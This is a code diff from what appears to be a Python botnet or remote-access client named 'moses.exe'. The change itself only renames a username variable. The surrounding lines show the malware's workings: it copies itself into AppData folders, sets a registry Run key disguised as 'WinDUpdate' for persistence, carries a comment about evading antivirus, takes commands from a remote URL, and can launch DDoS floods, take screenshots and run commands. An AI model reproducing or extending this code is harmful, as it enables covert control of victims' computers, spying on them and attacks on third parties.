@@ -27,14 +27,14 @@ def main():
     URL = "https://website.tld" #NO SLASH AT THE END OF THE URL
     master_filename = "moses.exe"
 
-    sys_username = get_sys_username()
+    win_user = get_win_user()
 
     path = ["\\AppData\\Roaming\\", "\\AppData\\Local\\"] # TODO: add more paths to store moses.exe
 
     for x in path:
         # this is fucky so it won't trigger av (as of now, it works...)
         try:
-            shutil.copyfile(master_filename, "C:\\Users\\" + sys_username + x + master_filename)
+            shutil.copyfile(master_filename, "C:\\Users\\" + win_user + x + master_filename)
         except:
             pass
         finally:
@@ -48,8 +48,8 @@ def main():
                     pass
 
     for x in path:
-        if (check_if_file_exists_in_path(x, sys_username, master_filename)):
-            os.system('REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /V "WinDUpdate" /t REG_SZ /F /D "' + "C:\\Users\\" + sys_username + x + master_filename + '"')
+        if (check_if_file_exists_in_path(x, win_user, master_filename)):
+            os.system('REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /V "WinDUpdate" /t REG_SZ /F /D "' + "C:\\Users\\" + win_user + x + master_filename + '"')
 
             # NOTE: this isn't needed, but i'll keep it here incase I do later (not sure why i put it here to being with)
             path = x
@@ -69,7 +69,7 @@ def main():
 
             ddos_target(target, stop_time)
         elif (signal == "2"): # take_screenshot()
-            take_screenshot(sys_username)
+            take_screenshot(win_user)
         elif (signal == "3"): # get_pub_ip_address()
             pass
         elif (signal == "4"): # execute_command()
@@ -96,10 +96,10 @@ def get_web_content(URL, wb_path):
     return web_content
 
 # used for getting system username
-def get_sys_username():
-    sys_username = getpass.getuser()
+def get_win_user():
+    win_user = getpass.getuser()
 
-    return sys_username
+    return win_user
 
 # used for getting current system time
 def get_current_time():
@@ -108,8 +108,8 @@ def get_current_time():
 
     return current_time
 
-def check_if_file_exists_in_path(x, sys_username, master_filename):
-    file_exists = os.path.isfile("C:\\Users\\" + sys_username + x + master_filename)
+def check_if_file_exists_in_path(x, win_user, master_filename):
+    file_exists = os.path.isfile("C:\\Users\\" + win_user + x + master_filename)
 
     return file_exists
 
@@ -173,11 +173,11 @@ def ddos_target(target, stop_time): # 1
         except:
             pass
 
-def take_screenshot(sys_username): # 2
+def take_screenshot(win_user): # 2
     filename = get_current_time()
     # example: 1357rethyxyz.png
     filename = str(filename.replace(":", ""))
-    filename = filename + sys_username + ".png"
+    filename = filename + win_user + ".png"
 
     screenshot = pyautogui.screenshot()
     screenshot.save(filename)
